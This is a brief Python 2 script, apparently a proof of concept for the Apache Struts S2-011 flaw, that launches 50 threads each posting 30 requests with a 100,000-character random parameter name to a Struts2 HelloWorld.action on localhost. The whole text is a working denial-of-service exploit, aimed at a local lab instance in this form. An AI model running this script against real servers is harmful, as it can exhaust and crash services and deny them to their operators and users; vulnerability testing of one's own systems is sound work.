import urllib
import urllib2
import random
import string
import threading

class ThreadClass(threading.Thread):
  def run(self):
    payload = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(100000))
    values = {payload : ''}
    data = urllib.urlencode(values)
    for x in range(30):
      request = urllib2.Request('http://localhost:8080/s2-011/example/HelloWorld.action', data)
      response = urllib2.urlopen(request)
      response.read()

for x in range(50):
  t = ThreadClass()
  t.start()
